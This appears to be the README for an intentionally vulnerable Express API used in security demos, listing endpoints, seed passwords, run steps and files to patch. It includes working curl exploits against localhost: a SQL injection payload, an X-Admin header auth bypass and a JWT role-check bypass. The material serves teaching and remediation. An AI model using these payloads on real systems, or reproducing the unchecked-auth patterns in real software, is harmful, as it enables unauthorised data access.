# target-app (vulnerable sandbox)

Deliberately insecure Express API for Chaos-Security-Monkey demos.

**Base URL:** `http://localhost:3000` (override with `PORT`)

## Endpoints

| Method | Path | Auth | Notes |
|--------|------|------|-------|
| `GET` | `/health` | none | Liveness check for orchestrator |
| `GET` | `/api/users/search?q=` | none | **SQL injection** (vulnerable) |
| `GET` | `/api/users/:id` | none | Safe lookup by numeric id |
| `POST` | `/api/auth/login` | none | Returns JWT (`alice` / `password123`) |
| `GET` | `/api/admin/secret` | broken | **Auth bypass** via header or any JWT |

## Seed users

| username | password | role |
|----------|----------|------|
| `alice` | `password123` | user |
| `bob` | `password123` | user |
| `admin` | `super-secret-admin` | admin |

## Run

```bash
npm install
npm start
```

From repo root:

```bash
npm run target
npm run monkey   # boots target-app and waits for /health
```

## Exploit examples (Teammate 2)

**SQL injection** — returns all users including admin:

```bash
curl -s "http://localhost:3000/api/users/search?q=' OR '1'='1"
```

**Normal search** — only matching username:

```bash
curl -s "http://localhost:3000/api/users/search?q=alice"
```

**Auth bypass** — no token required:

```bash
curl -s -H "X-Admin: true" http://localhost:3000/api/admin/secret
```

**Weak JWT bypass** — any logged-in user token works (role not checked):

```bash
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | jq -r .token)
curl -s -H "Authorization: Bearer $TOKEN" http://localhost:3000/api/admin/secret
```

## Files to patch (Teammate 3)

| Vulnerability | File |
|---------------|------|
| SQL injection | `routes/users.js` (`/search` handler) |
| Broken admin auth | `middleware/auth.js` |

After remediation, the SQLi curl should not leak admin rows; admin secret should require a real admin role.
